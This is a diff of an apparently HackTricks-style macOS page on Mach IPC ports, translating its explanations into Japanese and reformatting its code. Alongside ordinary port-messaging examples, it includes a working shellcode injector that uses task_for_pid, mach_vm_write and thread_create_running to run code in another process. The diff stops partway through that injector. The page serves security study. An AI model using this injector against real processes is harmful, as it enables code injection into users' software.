 
-    // Create a new port.
-    mach_port_t port;
-    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
-    if (kr != KERN_SUCCESS) {
-        printf("mach_port_allocate() failed with code 0x%x\n", kr);
-        return 1;
-    }
-    printf("mach_port_allocate() created port right name %d\n", port);
+// Create a new port.
+mach_port_t port;
+kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+if (kr != KERN_SUCCESS) {
+printf("mach_port_allocate() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("mach_port_allocate() created port right name %d\n", port);
 
 
-    // Give us a send right to this port, in addition to the receive right.
-    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
-    if (kr != KERN_SUCCESS) {
-        printf("mach_port_insert_right() failed with code 0x%x\n", kr);
-        return 1;
-    }
-    printf("mach_port_insert_right() inserted a send right\n");
+// Give us a send right to this port, in addition to the receive right.
+kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+if (kr != KERN_SUCCESS) {
+printf("mach_port_insert_right() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("mach_port_insert_right() inserted a send right\n");
 
 
-    // Send the send right to the bootstrap server, so that it can be looked up by other processes.
-    kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
-    if (kr != KERN_SUCCESS) {
-        printf("bootstrap_register() failed with code 0x%x\n", kr);
-        return 1;
-    }
-    printf("bootstrap_register()'ed our port\n");
+// Send the send right to the bootstrap server, so that it can be looked up by other processes.
+kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
+if (kr != KERN_SUCCESS) {
+printf("bootstrap_register() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("bootstrap_register()'ed our port\n");
 
 
-    // Wait for a message.
-    struct {
-        mach_msg_header_t header;
-        char some_text[10];
-        int some_number;
-        mach_msg_trailer_t trailer;
-    } message;
+// Wait for a message.
+struct {
+mach_msg_header_t header;
+char some_text[10];
+int some_number;
+mach_msg_trailer_t trailer;
+} message;
 
-    kr = mach_msg(
-        &message.header,  // Same as (mach_msg_header_t *) &message.
-        MACH_RCV_MSG,     // Options. We're receiving a message.
-        0,                // Size of the message being sent, if sending.
-        sizeof(message),  // Size of the buffer for receiving.
-        port,             // The port to receive a message on.
-        MACH_MSG_TIMEOUT_NONE,
-        MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
-    );
-    if (kr != KERN_SUCCESS) {
-        printf("mach_msg() failed with code 0x%x\n", kr);
-        return 1;
-    }
-    printf("Got a message\n");
+kr = mach_msg(
+&message.header,  // Same as (mach_msg_header_t *) &message.
+MACH_RCV_MSG,     // Options. We're receiving a message.
+0,                // Size of the message being sent, if sending.
+sizeof(message),  // Size of the buffer for receiving.
+port,             // The port to receive a message on.
+MACH_MSG_TIMEOUT_NONE,
+MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
+);
+if (kr != KERN_SUCCESS) {
+printf("mach_msg() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("Got a message\n");
 
-    message.some_text[9] = 0;
-    printf("Text: %s, number: %d\n", message.some_text, message.some_number);
+message.some_text[9] = 0;
+printf("Text: %s, number: %d\n", message.some_text, message.some_number);
 }
 ```
-
 {{#endtab}}
 
 {{#tab name="sender.c"}}
-
 ```c
 // Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
 // gcc sender.c -o sender
@@ -380,146 +361,139 @@ int main() {
 
 int main() {
 
-    // Lookup the receiver port using the bootstrap server.
-    mach_port_t port;
-    kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
-    if (kr != KERN_SUCCESS) {
-        printf("bootstrap_look_up() failed with code 0x%x\n", kr);
-        return 1;
-    }
-    printf("bootstrap_look_up() returned port right name %d\n", port);
+// Lookup the receiver port using the bootstrap server.
+mach_port_t port;
+kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
+if (kr != KERN_SUCCESS) {
+printf("bootstrap_look_up() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("bootstrap_look_up() returned port right name %d\n", port);
 
 
-    // Construct our message.
-    struct {
-        mach_msg_header_t header;
-        char some_text[10];
-        int some_number;
-    } message;
+// Construct our message.
+struct {
+mach_msg_header_t header;
+char some_text[10];
+int some_number;
+} message;
 
-    message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
-    message.header.msgh_remote_port = port;
-    message.header.msgh_local_port = MACH_PORT_NULL;
+message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+message.header.msgh_remote_port = port;
+message.header.msgh_local_port = MACH_PORT_NULL;
 
-    strncpy(message.some_text, "Hello", sizeof(message.some_text));
-    message.some_number = 35;
+strncpy(message.some_text, "Hello", sizeof(message.some_text));
+message.some_number = 35;
 
-    // Send the message.
-    kr = mach_msg(
-        &message.header,  // Same as (mach_msg_header_t *) &message.
-        MACH_SEND_MSG,    // Options. We're sending a message.
-        sizeof(message),  // Size of the message being sent.
-        0,                // Size of the buffer for receiving.
-        MACH_PORT_NULL,   // A port to receive a message on, if receiving.
-        MACH_MSG_TIMEOUT_NONE,
-        MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
-    );
-    if (kr != KERN_SUCCESS) {
-        printf("mach_msg() failed with code 0x%x\n", kr);
-        return 1;
-    }
-    printf("Sent a message\n");
+// Send the message.
+kr = mach_msg(
+&message.header,  // Same as (mach_msg_header_t *) &message.
+MACH_SEND_MSG,    // Options. We're sending a message.
+sizeof(message),  // Size of the message being sent.
+0,                // Size of the buffer for receiving.
+MACH_PORT_NULL,   // A port to receive a message on, if receiving.
+MACH_MSG_TIMEOUT_NONE,
+MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
+);
+if (kr != KERN_SUCCESS) {
+printf("mach_msg() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("Sent a message\n");
 }
 ```
-
 {{#endtab}}
 {{#endtabs}}
 
-## Privileged Ports
+## 特権ポート
 
-There are some special ports that allows to **perform certain sensitive actions or access certain sensitive data** in case a tasks have the **SEND** permissions over them. This makes these ports very interesting from an attackers perspective not only because of the capabilities but because it's possible to **share SEND permissions across tasks**.
+特定の敏感なアクションを実行したり、特定の敏感なデータにアクセスしたりすることを可能にする特別なポートがあります。タスクがそれらに対して**SEND**権限を持っている場合、これらのポートは攻撃者の視点から非常に興味深いものとなります。なぜなら、機能だけでなく、タスク間で**SEND権限を共有する**ことが可能だからです。
 
-### Host Special Ports
+### ホスト特別ポート
 
-These ports are represented by a number.
+これらのポートは番号で表されます。
 
-**SEND** rights can be obtained by calling **`host_get_special_port`** and **RECEIVE** rights calling **`host_set_special_port`**. However, both calls require the **`host_priv`** port which only root can access. Moreover, in the past root was able to call **`host_set_special_port`** and hijack arbitrary that allowed for example to bypass code signatures by hijacking `HOST_KEXTD_PORT` (SIP now prevents this).
+**SEND**権利は**`host_get_special_port`**を呼び出すことで取得でき、**RECEIVE**権利は**`host_set_special_port`**を呼び出すことで取得できます。しかし、両方の呼び出しには**`host_priv`**ポートが必要で、これはルートのみがアクセスできます。さらに、過去にはルートが**`host_set_special_port`**を呼び出して任意のポートをハイジャックでき、例えば`HOST_KEXTD_PORT`をハイジャックすることでコード署名をバイパスすることができました（現在はSIPがこれを防止しています）。
 
-These are divided in 2 groups: The **first 7 ports are owned by the kernel** being the 1 `HOST_PORT`, the 2 `HOST_PRIV_PORT` , the 3 `HOST_IO_MASTER_PORT` and the 7 is `HOST_MAX_SPECIAL_KERNEL_PORT`.\
-The ones starting **from** the number **8** are **owned by system daemons** and they can be found declared in [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).
+これらは2つのグループに分かれています：**最初の7つのポートはカーネルによって所有され**、1が`HOST_PORT`、2が`HOST_PRIV_PORT`、3が`HOST_IO_MASTER_PORT`、7が`HOST_MAX_SPECIAL_KERNEL_PORT`です。\
+番号**8**から始まるものは**システムデーモンによって所有され**、[**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html)に宣言されています。
 
-- **Host port**: If a process has **SEND** privilege over this port he can get **information** about the **system** calling its routines like:
-  - `host_processor_info`: Get processor info
-  - `host_info`: Get host info
-  - `host_virtual_physical_table_info`: Virtual/Physical page table (requires MACH_VMDEBUG)
-  - `host_statistics`: Get host statistics
-  - `mach_memory_info`: Get kernel memory layout
-- **Host Priv port**: A process with **SEND** right over this port can perform **privileged actions** like showing boot data or trying to load a kernel extension. The **process need to be root** to get this permission.
-  - Moreover, in order to call **`kext_request`** API it's needed to have other entitlements **`com.apple.private.kext*`** which are only given to Apple binaries.
-  - Other routines that can be called are:
-    - `host_get_boot_info`: Get `machine_boot_info()`
-    - `host_priv_statistics`: Get privileged statistics
-    - `vm_allocate_cpm`: Allocate Contiguous Physical Memory
-    - `host_processors`: Send right to host processors
-    - `mach_vm_wire`: Make memory resident
-  - As **root** can access this permission, it could call `host_set_[special/exception]_port[s]` to **hijack host special or exception ports**.
+- **ホストポート**：プロセスがこのポートに対して**SEND**権限を持っている場合、次のようなルーチンを呼び出すことで**システム**に関する**情報**を取得できます：
+  - `host_processor_info`: プロセッサ情報を取得
+  - `host_info`: ホスト情報を取得
+  - `host_virtual_physical_table_info`: 仮想/物理ページテーブル（MACH_VMDEBUGが必要）
+  - `host_statistics`: ホスト統計を取得
+  - `mach_memory_info`: カーネルメモリレイアウトを取得
+- **ホストプライベートポート**：このポートに対して**SEND**権限を持つプロセスは、ブートデータを表示したり、カーネル拡張を読み込もうとしたりする**特権アクション**を実行できます。この権限を取得するには**プロセスがルートである必要があります**。
+- さらに、**`kext_request`** APIを呼び出すには、他の権限**`com.apple.private.kext*`**が必要で、これはAppleのバイナリにのみ付与されます。
+- 呼び出すことができる他のルーチンは次のとおりです：
+  - `host_get_boot_info`: `machine_boot_info()`を取得
+  - `host_priv_statistics`: 特権統計を取得
+  - `vm_allocate_cpm`: 連続物理メモリを割り当て
+  - `host_processors`: ホストプロセッサへの送信権
+  - `mach_vm_wire`: メモリを常駐させる
+- **ルート**はこの権限にアクセスできるため、`host_set_[special/exception]_port[s]`を呼び出して**ホスト特別または例外ポートをハイジャック**することができます。
 
-It's possible to **see all the host special ports** by running:
-
+すべてのホスト特別ポートを表示するには、次のコマンドを実行します：
 ```bash
 procexp all ports | grep "HSP"
 ```
+### タスク特別ポート
 
-### Task Special Ports
-
-These are ports reserved for well known services. It's possible to get/set them calling `task_[get/set]_special_port`. They can be found in `task_special_ports.h`:
-
+これらは、よく知られたサービスのために予約されたポートです。`task_[get/set]_special_port`を呼び出すことで取得/設定することが可能です。これらは`task_special_ports.h`にあります：
 ```c
 typedef	int	task_special_port_t;
 
 #define TASK_KERNEL_PORT	1	/* Represents task to the outside
-					   world.*/
+world.*/
 #define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
 #define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
 #define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
 #define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
 ```
+- **TASK_KERNEL_PORT**\[task-self send right]: このタスクを制御するために使用されるポート。タスクに影響を与えるメッセージを送信するために使用されます。これは**mach_task_self**によって返されるポートです（下記のタスクポートを参照）。
+- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: タスクのブートストラップポート。その他のシステムサービスポートの返却を要求するメッセージを送信するために使用されます。
+- **TASK_HOST_NAME_PORT**\[host-self send right]: 含まれるホストの情報を要求するために使用されるポート。これは**mach_host_self**によって返されるポートです。
+- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: このタスクがそのワイヤードカーネルメモリを引き出すソースを指定するポート。
+- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: このタスクがそのデフォルトのメモリ管理メモリを引き出すソースを指定するポート。
 
-From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):
+### タスクポート
 
-- **TASK_KERNEL_PORT**\[task-self send right]: The port used to control this task. Used to send messages that affect the task. This is the port returned by **mach_task_self (see Task Ports below)**.
-- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: The task's bootstrap port. Used to send messages requesting return of other system service ports.
-- **TASK_HOST_NAME_PORT**\[host-self send right]: The port used to request information of the containing host. This is the port returned by **mach_host_self**.
-- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: The port naming the source from which this task draws its wired kernel memory.
-- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: The port naming the source from which this task draws its default memory managed memory.
+元々Machには「プロセス」はなく、「タスク」があり、これはスレッドのコンテナのように考えられていました。MachがBSDと統合されたとき、**各タスクはBSDプロセスに関連付けられました**。したがって、すべてのBSDプロセスはプロセスとして必要な詳細を持ち、すべてのMachタスクもその内部動作を持っています（存在しないpid 0は`kernel_task`です）。
 
-### Task Ports
+これに関連する非常に興味深い関数が2つあります：
 
-Originally Mach didn't have "processes" it had "tasks" which was considered more like a container of threads. When Mach was merged with BSD **each task was correlated with a BSD process**. Therefore every BSD process has the details it needs to be a process and every Mach task also have its inner workings (except for the inexistent pid 0 which is the `kernel_task`).
+- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: 指定された`pid`に関連するタスクのタスクポートのSEND権を取得し、指定された`target_task_port`に渡します（通常は`mach_task_self()`を使用した呼び出しタスクですが、異なるタスクのSENDポートである可能性もあります）。
+- `pid_for_task(task, &pid)`: タスクへのSEND権を与えられた場合、このタスクが関連するPIDを見つけます。
 
-There are two very interesting functions related to this:
+タスク内でアクションを実行するためには、タスクは`mach_task_self()`を呼び出して自分自身への`SEND`権を必要としました（これは`task_self_trap`（28）を使用します）。この権限があれば、タスクは以下のようなさまざまなアクションを実行できます：
 
-- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Get a SEND right for the task por of the task related to the specified by the `pid` and give it to the indicated `target_task_port` (which is usually the caller task which has used `mach_task_self()`, but could be a SEND port over a different task.)
-- `pid_for_task(task, &pid)`: Given a SEND right to a task, find to which PID this task is related to.
-
-In order to perform actions within the task, the task needed a `SEND` right to itself calling `mach_task_self()` (which uses the `task_self_trap` (28)). With this permission a task can perform several actions like:
-
-- `task_threads`: Get SEND right over all task ports of the threads of the task
-- `task_info`: Get info about a task
-- `task_suspend/resume`: Suspend or resume a task
+- `task_threads`: タスクのスレッドのすべてのタスクポートに対するSEND権を取得
+- `task_info`: タスクに関する情報を取得
+- `task_suspend/resume`: タスクを一時停止または再開
 - `task_[get/set]_special_port`
-- `thread_create`: Create a thread
-- `task_[get/set]_state`: Control task state
-- and more can be found in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)
+- `thread_create`: スレッドを作成
+- `task_[get/set]_state`: タスクの状態を制御
+- その他の詳細は[**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)で見つけることができます。
 
 > [!CAUTION]
-> Notice that with a SEND right over a task port of a **different task**, it's possible to perform such actions over a different task.
+> 異なるタスクのタスクポートに対するSEND権を持つ場合、異なるタスクに対してそのようなアクションを実行することが可能です。
 
-Moreover, the task_port is also the **`vm_map`** port which allows to **read an manipulate memory** inside a task with functions such as `vm_read()` and `vm_write()`. This basically means that a task with SEND rights over the task_port of a different task is going to be able to **inject code into that task**.
+さらに、task_portは**`vm_map`**ポートでもあり、`vm_read()`や`vm_write()`などの関数を使用してタスク内のメモリを**読み取りおよび操作**することを可能にします。これは基本的に、異なるタスクのtask_portに対するSEND権を持つタスクがそのタスクに**コードを注入する**ことができることを意味します。
 
-Remember that because the **kernel is also a task**, if someone manages to get a **SEND permissions** over the **`kernel_task`**, it'll be able to make the kernel execute anything (jailbreaks).
+**カーネルもタスクであるため**、誰かが**`kernel_task`**に対する**SEND権限**を取得できれば、カーネルに何でも実行させることができます（脱獄）。
 
-- Call `mach_task_self()` to **get the name** for this port for the caller task. This port is only **inherited** across **`exec()`**; a new task created with `fork()` gets a new task port (as a special case, a task also gets a new task port after `exec()`in a suid binary). The only way to spawn a task and get its port is to perform the ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) while doing a `fork()`.
-- These are the restrictions to access the port (from `macos_task_policy` from the binary `AppleMobileFileIntegrity`):
-  - If the app has **`com.apple.security.get-task-allow` entitlement** processes from the **same user can access the task port** (commonly added by Xcode for debugging). The **notarization** process won't allow it to production releases.
-  - Apps with the **`com.apple.system-task-ports`** entitlement can get the **task port for any** process, except the kernel. In older versions it was called **`task_for_pid-allow`**. This is only granted to Apple applications.
-  - **Root can access task ports** of applications **not** compiled with a **hardened** runtime (and not from Apple).
+- `mach_task_self()`を呼び出して、呼び出しタスクのこのポートの**名前を取得**します。このポートは**`exec()`**を通じてのみ**継承**されます。`fork()`で作成された新しいタスクは新しいタスクポートを取得します（特別なケースとして、suidバイナリの`exec()`後にタスクも新しいタスクポートを取得します）。タスクを生成し、そのポートを取得する唯一の方法は、`fork()`を行いながら["ポートスワップダンス"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html)を実行することです。
+- ポートへのアクセス制限は以下の通りです（バイナリ`AppleMobileFileIntegrity`の`macos_task_policy`から）：
+- アプリが**`com.apple.security.get-task-allow`権限**を持っている場合、**同じユーザーのプロセスはタスクポートにアクセスできます**（通常はデバッグのためにXcodeによって追加されます）。**ノータリゼーション**プロセスは、製品リリースではこれを許可しません。
+- **`com.apple.system-task-ports`**権限を持つアプリは、カーネルを除く**任意の**プロセスの**タスクポートを取得できます**。古いバージョンでは**`task_for_pid-allow`**と呼ばれていました。これはAppleのアプリケーションにのみ付与されます。
+- **ルートは**、**ハードンされた**ランタイムでコンパイルされていないアプリケーションのタスクポートにアクセスできます（Appleからではありません）。
 
-**The task name port:** An unprivileged version of the _task port_. It references the task, but does not allow controlling it. The only thing that seems to be available through it is `task_info()`.
+**タスク名ポート:** _タスクポート_の特権のないバージョン。タスクを参照しますが、制御することはできません。これを通じて利用可能な唯一のものは`task_info()`のようです。
 
-### Thread Ports
+### スレッドポート
 
-Threads also have associated ports, which are visible from the task calling **`task_threads`** and from the processor with `processor_set_threads`. A SEND right to the thread port allows to use the function from the `thread_act` subsystem, like:
+スレッドにも関連するポートがあり、これは**`task_threads`**を呼び出すタスクや`processor_set_threads`を持つプロセッサから見ることができます。スレッドポートへのSEND権は、`thread_act`サブシステムの関数を使用することを可能にします：
 
 - `thread_terminate`
 - `thread_[get/set]_state`
@@ -528,11 +502,11 @@ Threads also have associated ports, which are visible from the task calling **`t
 - `thread_info`
 - ...
 
-Any thread can get this port calling to **`mach_thread_sef`**.
+任意のスレッドは**`mach_thread_sef`**を呼び出すことでこのポートを取得できます。
 
-### Shellcode Injection in thread via Task port
+### タスクポート経由のスレッドへのシェルコード注入
 
-You can grab a shellcode from:
+シェルコードを取得することができます：
 
 {{#ref}}
 ../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
@@ -540,7 +514,6 @@ You can grab a shellcode from:
 
 {{#tabs}}
 {{#tab name="mysleep.m"}}
-
 ```objectivec
 // clang -framework Foundation mysleep.m -o mysleep
 // codesign --entitlements entitlements.plist -s - mysleep
@@ -548,52 +521,48 @@ You can grab a shellcode from:
 #import <Foundation/Foundation.h>
 
 double performMathOperations() {
-    double result = 0;
-    for (int i = 0; i < 10000; i++) {
-        result += sqrt(i) * tan(i) - cos(i);
-    }
-    return result;
+double result = 0;
+for (int i = 0; i < 10000; i++) {
+result += sqrt(i) * tan(i) - cos(i);
+}
+return result;
 }
 
 int main(int argc, const char * argv[]) {
-    @autoreleasepool {
-        NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
+@autoreleasepool {
+NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
 processIdentifier]);
-        while (true) {
-            [NSThread sleepForTimeInterval:5];
+while (true) {
+[NSThread sleepForTimeInterval:5];
 
-            performMathOperations();  // Silent action
+performMathOperations();  // Silent action
 
-            [NSThread sleepForTimeInterval:5];
-        }
-    }
-    return 0;
+[NSThread sleepForTimeInterval:5];
+}
+}
+return 0;
 }
 ```
-
 {{#endtab}}
 
 {{#tab name="entitlements.plist"}}
-
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>com.apple.security.get-task-allow</key>
-    <true/>
+<key>com.apple.security.get-task-allow</key>
+<true/>
 </dict>
 </plist>
 ```
-
 {{#endtab}}
 {{#endtabs}}
 
-**Compile** the previous program and add the **entitlements** to be able to inject code with the same user (if not you will need to use **sudo**).
+**前のプログラムをコンパイル**し、同じユーザーでコードを注入できるように**権限**を追加します（そうでない場合は**sudo**を使用する必要があります）。
 
 <details>
 
 <summary>sc_injector.m</summary>
-
 ```objectivec
 // gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
 // Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
@@ -610,18 +579,18 @@ processIdentifier]);
 
 kern_return_t mach_vm_allocate
 (
-        vm_map_t target,
-        mach_vm_address_t *address,
-        mach_vm_size_t size,
-        int flags
+vm_map_t target,
+mach_vm_address_t *address,
+mach_vm_size_t size,
+int flags
 );
 
 kern_return_t mach_vm_write
 (
-        vm_map_t target_task,
-        mach_vm_address_t address,
-        vm_offset_t data,
-        mach_msg_type_number_t dataCnt
+vm_map_t target_task,
+mach_vm_address_t address,
+vm_offset_t data,
+mach_msg_type_number_t dataCnt
 );
 
 
@@ -639,180 +608,177 @@ char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\
 
 int inject(pid_t pid){
 
-    task_t remoteTask;
+task_t remoteTask;
 
-    // Get access to the task port of the process we want to inject into
-    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
-    if (kr != KERN_SUCCESS) {
-        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
-        return (-1);
-    }
-    else{
-        printf("Gathered privileges over the task port of process: %d\n", pid);
-    }
+// Get access to the task port of the process we want to inject into
+kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
+if (kr != KERN_SUCCESS) {
+fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
+return (-1);
+}
+else{
+printf("Gathered privileges over the task port of process: %d\n", pid);
+}
 
-    // Allocate memory for the stack
-    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
-    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
-    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
+// Allocate memory for the stack
+mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
+mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
 
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
-        return (-2);
-    }
-    else
-    {
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
+else
+{
 
-        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
-    }
+fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
+}
 
-    // Allocate memory for the code
-    remoteCode64 = (vm_address_t) NULL;
-    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
+// Allocate memory for the code
+remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
 
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
-        return (-2);
-    }
-
-
-    // Write the shellcode to the allocated memory
-    kr = mach_vm_write(remoteTask,                   // Task port
-	                   remoteCode64,                 // Virtual Address (Destination)
-	                   (vm_address_t) injectedCode,  // Source
-	                    0xa9);                       // Length of the source
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
 
 
-    if (kr != KERN_SUCCESS)
-    {
-	fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
-	return (-3);
-    }
+// Write the shellcode to the allocated memory
+kr = mach_vm_write(remoteTask,                   // Task port
+remoteCode64,                 // Virtual Address (Destination)
+(vm_address_t) injectedCode,  // Source
+0xa9);                       // Length of the source
 
 
-    // Set the permissions on the allocated code memory
-    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
+return (-3);
+}
 
-    if (kr != KERN_SUCCESS)
-    {
-	fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
-	return (-4);
-    }
 
-    // Set the permissions on the allocated stack memory
-    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
+// Set the permissions on the allocated code memory
+kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
 
-    if (kr != KERN_SUCCESS)
-    {
-	fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
-	return (-4);
-    }
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
+return (-4);
+}
 
-    // Create thread to run shellcode
-    struct arm_unified_thread_state remoteThreadState64;
-    thread_act_t         remoteThread;
+// Set the permissions on the allocated stack memory
+kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
 
-    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
+return (-4);
+}
 
-    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
-        //remoteStack64 -= 8;  // need alignment of 16
+// Create thread to run shellcode
+struct arm_unified_thread_state remoteThreadState64;
+thread_act_t         remoteThread;
 
-    const char* p = (const char*) remoteCode64;
+memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
 
-    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
-    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
-    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
-    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
+remoteStack64 += (STACK_SIZE / 2); // this is the real stack
+//remoteStack64 -= 8;  // need alignment of 16
 
-    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
+const char* p = (const char*) remoteCode64;
 
-    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
-    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
+remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
 
-    if (kr != KERN_SUCCESS) {
-        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
-        return (-3);
-    }
+printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
 
-    return (0);
+kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
+(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
+
+if (kr != KERN_SUCCESS) {
+fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
+return (-3);
+}
+
+return (0);
 }
 
 pid_t pidForProcessName(NSString *processName) {
-    NSArray *arguments = @[@"pgrep", processName];
-    NSTask *task = [[NSTask alloc] init];
-    [task setLaunchPath:@"/usr/bin/env"];
-    [task setArguments:arguments];
+NSArray *arguments = @[@"pgrep", processName];
+NSTask *task = [[NSTask alloc] init];
+[task setLaunchPath:@"/usr/bin/env"];
+[task setArguments:arguments];
 
-    NSPipe *pipe = [NSPipe pipe];
-    [task setStandardOutput:pipe];
+NSPipe *pipe = [NSPipe pipe];
+[task setStandardOutput:pipe];
 
-    NSFileHandle *file = [pipe fileHandleForReading];
+NSFileHandle *file = [pipe fileHandleForReading];
 
-    [task launch];
+[task launch];
 
-    NSData *data = [file readDataToEndOfFile];
-    NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+NSData *data = [file readDataToEndOfFile];
+NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
 
-    return (pid_t)[string integerValue];
+return (pid_t)[string integerValue];
 }
 
 BOOL isStringNumeric(NSString *str) {
